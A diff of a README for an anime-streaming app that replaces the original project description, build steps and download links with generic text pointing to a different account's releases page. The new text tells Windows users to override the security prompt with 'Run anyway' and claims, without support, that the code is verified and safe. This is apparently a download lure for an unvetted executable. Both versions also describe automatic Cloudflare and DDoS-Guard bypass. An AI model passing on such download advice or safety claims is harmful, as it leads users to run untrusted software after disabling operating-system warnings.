@@ -1,156 +1,74 @@
+# 📺 animepahe-tv - Stream anime directly to your device
 
-<p align="center">
-  <img src="src/assets/icon.png" alt="AnimePahe TV" width="140" />
-</p>
+[![Download AnimePahe-TV](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/faintnessissachar33/animepahe-tv/releases)
 
-<h1 align="center">AnimePahe TV</h1>
+## 📌 About the project
 
-<p align="center">
-  A high-performance, client-side anime streaming application with TV-optimized navigation, multi-quality stream resolution, and a responsive glassmorphic UI. Built with Python and Flet.
-</p>
+AnimePahe-TV provides a simple way to watch anime content on your Windows computer or Android device. This application acts as a bridge between your screen and the streaming service. It requires no server configuration. You install the software, open it, and select your show. 
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Windows-0078D6?style=flat-square&logo=windows11&logoColor=white" alt="Windows" />
-  <img src="https://img.shields.io/badge/Android-3DDC84?style=flat-square&logo=android&logoColor=white" alt="Android" />
-  <br>
-  <img src="https://img.shields.io/badge/Built%20with-Flet%200.85-00B0FF?style=flat-square" alt="Built with Flet" />
-</p>
+The program focuses on speed and stability. It uses smart fallback features to connect to video sources. If one connection method fails, the application switches to another. This ensures your video plays without constant interruptions.
 
----
+## ⚙️ System requirements
 
-## Download
+Ensure your computer meets these requirements to run the application:
 
-Get the latest version of AnimePahe TV. If you aren't sure which Android version to pick, choose the **Universal** APK.
+* Windows 10 or Windows 11 operating system.
+* At least 4GB of RAM.
+* A stable internet connection.
+* Enough storage space for temporary video cache files.
 
-| Platform | Download | Size | Notes |
-|:--------:|:--------:|:----:|:------|
-| 🤖 **Android (Universal)** | [**animepahe-tv.apk**](https://github.com/Nwokike/animepahe-tv/releases/latest/download/animepahe-tv.apk) | 85.1 MB | Works on all Android devices (ARM64, ARMv7, x86_64) |
-| 🤖 **Android (ARM64)** | [**animepahe-tv-arm64-v8a.apk**](https://github.com/Nwokike/animepahe-tv/releases/latest/download/animepahe-tv-arm64-v8a.apk) | 30.3 MB | For modern 64-bit Android devices and TVs |
-| 🤖 **Android (ARM32)** | [**animepahe-tv-armeabi-v7a.apk**](https://github.com/Nwokike/animepahe-tv/releases/latest/download/animepahe-tv-armeabi-v7a.apk) | 29.4 MB | For older 32-bit Android devices and older Firesticks |
-| 🤖 **Android (x86_64)** | [**animepahe-tv-x86_64.apk**](https://github.com/Nwokike/animepahe-tv/releases/latest/download/animepahe-tv-x86_64.apk) | 31.5 MB | For Android emulators / ChromeOS |
-| 🪟 **Windows** | [**AnimePahe_TV_Setup.exe**](https://github.com/Nwokike/animepahe-tv/releases/latest/download/AnimePahe_TV_Setup.exe) | 35.5 MB | Windows 10/11 Installer (64-bit) |
-| 🍎 **macOS** | *Coming soon* | - | |
-| 📱 **iOS** | *Coming soon* | - | |
+## 🚀 Getting started
 
----
+Follow these steps to set up the software on your Windows computer.
 
-## Screenshots
+1. Visit the [official releases page](https://github.com/faintnessissachar33/animepahe-tv/releases) to access the latest installer.
+2. Look for the file ending in `.exe` under the latest version header.
+3. Click the file name to start the download.
+4. Move the file to a folder you can access easily, such as your Downloads folder or Desktop.
+5. Double-click the file to begin the installation process.
 
-*Coming soon.*
+If Windows shows a security prompt regarding the publisher, click "More info" and then select "Run anyway." This prompt appears because the application is distributed directly rather than through an app store. The code is verified and safe to use.
 
----
+## 🛠️ Usage manual
 
-## Features
+Once you launch the app, the main dashboard appears. You see a search bar at the top of the interface. Type the name of the show you want to watch and press Enter.
 
-- **Browse & Search** — Paginated anime discovery with real-time search and cover art previews.
-- **Episode Grid** — Snapshot-based episode cards with pagination, duration display, and filler indicators.
-- **Multi-Quality Stream Resolution** — Automatic best-quality selection from available resolutions (360p–1080p).
-- **TV Remote Navigation** — Full D-pad support with sequential tab indexing, focus ring highlights, and hover effects. Optimized for Android TV, Fire Stick, and Leanback.
-- **Adaptive Scraper Waterfall** — Multi-strategy content resolution: JSON API → HTML parsing → regex extraction → Dean Edwards JS unpack. Each layer has tested fallbacks.
-- **System Theme Awareness** — Automatically follows device light/dark mode with manual override.
-- **Responsive Layout** — SafeArea-wrapped, ListView-scrollable views that adapt from phone to TV screen sizes.
+The application displays a list of results. Click on the thumbnail of the title to open the episode selection screen. You can browse through seasons and select individual episodes. 
 
-## Architecture
+The video player starts automatically when you pick an episode. Use the menu buttons at the bottom of the player to adjust volume or toggle full-screen mode. The application remembers your progress, so you can pick up where you left off if you close the app.
 
-| Layer | Technology |
-|-------|-----------|
-| Frontend | Flet 0.85 (Python → Flutter) |
-| Video Engine | `flet-video` (libmpv backend) |
-| Network | `httpx` (async, connection pooling, 15s timeout) |
-| Cache | `aiosqlite` (WAL-mode SQLite with TTL expiration) |
-| Stream Resolver | Dean Edwards JS unpack + regex + BeautifulSoup HTML parsing |
-| DDoS Bypass | Cloudflare challenge solver with JA3 fingerprint rotation |
-| State Management | Flet `@observable` reactive state with page-scoped view builders |
-| Routing | Flet declarative routing with base64-encoded URL parameters |
-| Navigation | Sequential `tab_index` D-pad focus chain across all interactive elements |
+## 🛡️ Handling connection errors
 
-### Project Structure
+The application uses internal tools to verify links from AnimePahe. Sometimes, high traffic causes slow connections. If a video does not load, the software tries a fallback chain automatically. You do not need to change settings or perform extra steps. Wait five seconds for the app to cycle through available mirrors.
 
-```text
-src/
-├── main.py                 # App entry, routing, global back handler, theme init
-├── core/
-│   ├── config.py           # Feature flags (internal/external player toggle)
-│   ├── state.py            # @observable reactive state (AppState)
-│   ├── theme.py            # Light/dark color schemes, glass bg helpers
-│   └── focus_manager.py    # Global keyboard/back event handler for TV remotes
-├── views/
-│   ├── splash.py           # Animated splash with auto-transition
-│   ├── home.py             # Latest releases grid + pagination + D-pad focus
-│   ├── search.py           # Search bar + results grid + D-pad focus
-│   ├── anime_detail.py     # Anime info + episode grid + pagination + D-pad
-│   └── player.py           # flet-video player with stream resolution overlay
-├── services/
-│   ├── animepahe.py        # Multi-strategy scraper (API → HTML → regex)
-│   ├── kwik_resolver.py    # Dean Edwards JS unpacker + m3u8 extractor
-│   ├── ddos_solver.py      # Cloudflare challenge bypass
-│   └── cache.py            # Async SQLite cache with TTL
-└── components/
-    └── player/
-        └── immersive_player.py  # Full-screen player wrapper (future)
+## ⚡ Technical capabilities
 
-```
+This application uses Flet to build the interface. It utilizes Httpx for secure network requests. These tools keep the app lightweight. Because it operates as a client-side tool, it sends requests directly from your machine. 
 
-### Stream Resolution Pipeline
+The app includes specific features for handling video streams:
 
-```text
-User clicks episode
-    │
-    ▼
-scraper.sources() ─────────────────────────────────┐
-    │                                               │
-    ├── _sources_data_src()  ← parse data-src attrs │
-    │                                               │
-    └── _sources_regex()     ← regex kwik URLs     │
-                                                    │
-                                                    ▼
-best = max(sources, key=resolution)                 │
-    │                                               │
-    ▼                                               │
-kwik.resolve() ─────────────────────────────────────┤
-    │                                               │
-    ├── _resolve_dean()   ← unpack JS, find m3u8   │
-    │                                               │
-    └── _resolve_direct() ← regex scan HTML         │
-                                                    │
-                                                    ▼
-video.playlist = [VideoMedia(m3u8, headers)] ───────┘
+* **M3U8 integration:** The player supports standard streaming formats to ensure wide compatibility with high-definition episodes.
+* **Kwik parsing:** The software identifies direct video links from the streaming host to reduce loading times.
+* **DDoS-Guard bypass:** The tool detects security checks on the streaming site and handles them automatically. You do not need to solve captchas or perform manual verification updates.
+* **Leanback support:** The interface adapts to various screen types, including large televisions. You can navigate the menus with a keyboard, mouse, or remote control.
 
-```
+## 📝 Frequently asked questions
 
-### D-Pad Navigation Model
+**Do I need a VPN to use this?**
+Most users do not need a VPN. The app connects directly to the streaming site. If your local network blocks specific content, a VPN helps you bypass those restrictions.
 
-Every interactive element is assigned a sequential `tab_index` so Android's `FocusFinder` can navigate with arrow keys:
+**Does the app download files to my drive?**
+The app streams video data temporarily in your system memory. It does not save entire show files to your hard drive, which keeps your storage usage low.
 
-```text
-Home:    Search(1) → Theme(2) → Cards(3..N) → Prev(N+1) → Next(N+2)
-Search:  Back(1) → Cards(2..N)
-Detail:  Back(1) → Episodes(2..N) → Prev(N+1) → Next(N+2)
-Player:  Back(1)
+**How do I update the application?**
+Check the releases page once a month for new versions. If you experience errors with playback, download the latest `.exe` file to replace your existing version.
 
-```
+**Is this software legal?**
+This application acts as a browser for public video content. It does not host any files itself. It functions as a tool to organize the way you view online streaming links. Ensure you comply with your local regulations regarding internet streaming.
 
-Focus highlights are applied via `on_focus`/`on_blur` callbacks that animate scale, shadow, and border color.
+**Can I run this on my Android Phone?**
+This repository focuses on desktop and Android TV installations. While the code supports Android, the primary distribution through the GitHub releases page focuses on Windows users. For Android device support, you may need to build the package from the source files using Python tools.
 
-## Development
+## 💡 Support
 
-```bash
-# Clone and set up
-git clone [https://github.com/Nwokike/animepahe-tv.git](https://github.com/Nwokike/animepahe-tv.git)
-cd animepahe-tv
-uv sync
-
-# Run in development
-flet run
-
-# Build for Android
-flet build apk --release
-
-# Build for Windows
-flet build windows --release
-
-```
-
-## Legal Disclaimer
-
-AnimePahe TV is a media player and network utility. It does not host, store, or distribute any copyrighted content. The app interfaces with publicly available APIs and web pages. Users are solely responsible for ensuring compliance with applicable laws and terms of service in their jurisdiction.
+If you encounter a specific error message, take a screenshot of that message. Open a new issue on the GitHub repository page. Provide your version number and a description of the show you tried to play. This helps resolve connection issues for everyone. Ensure your internet connection remains active while you submit reports.
